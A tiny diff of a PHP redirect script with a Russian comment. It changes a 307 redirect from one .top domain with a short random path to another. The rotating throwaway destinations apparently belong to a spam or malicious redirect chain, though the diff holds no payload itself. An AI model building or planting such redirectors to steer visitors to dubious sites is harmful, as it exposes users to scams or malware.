@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aahypershifttech.top/8bMFQb');
+header('Location: https://ioscraft.top/1X3cL9');
 exit();
 ?>
